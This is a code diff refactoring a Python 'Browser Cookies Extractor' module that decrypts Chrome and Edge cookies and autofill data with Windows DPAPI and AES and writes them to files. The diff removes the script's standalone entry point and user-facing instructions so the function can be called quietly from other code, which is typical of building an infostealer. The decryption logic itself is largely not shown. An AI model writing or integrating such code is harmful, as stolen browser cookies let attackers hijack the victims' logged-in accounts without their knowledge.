@@ -1,3 +1,8 @@
+"""
+Browser Cookies Extractor Module
+Refactored from cookies.py for better integration
+"""
+
 import os
 import json
 import base64
@@ -34,7 +39,7 @@ AUTOFILL_NAME_PATTERNS = [
 try:
     from Crypto.Cipher import AES  # pycryptodome
 except Exception:
-    AES = None  # will error later with a clear message
+    AES = None
 
 try:
     import win32crypt  # pywin32
@@ -459,14 +464,4 @@ def get_browser_cookies(output_dir="Cookies"):
                 total_files += 1
 
     print(f"[Done] Wrote {total_files} files into '{outdir.resolve()}', total cookie rows: {total_rows}")
-
-
-if __name__ == "__main__":
-    if os.name == "nt":
-        print("Info: Run as the same Windows user who used the browsers.")
-        print("Info: Close Chrome/Edge and disable background apps (chrome://settings/system).")
-        print("Info: Avoid running from services/SYSTEM; prefer normal user session.")
-    else:
-        print("Warn: This script is tailored for Windows DPAPI decryption (Windows only).")
-
-    get_browser_cookies(output_dir="Cookies")
+    return True
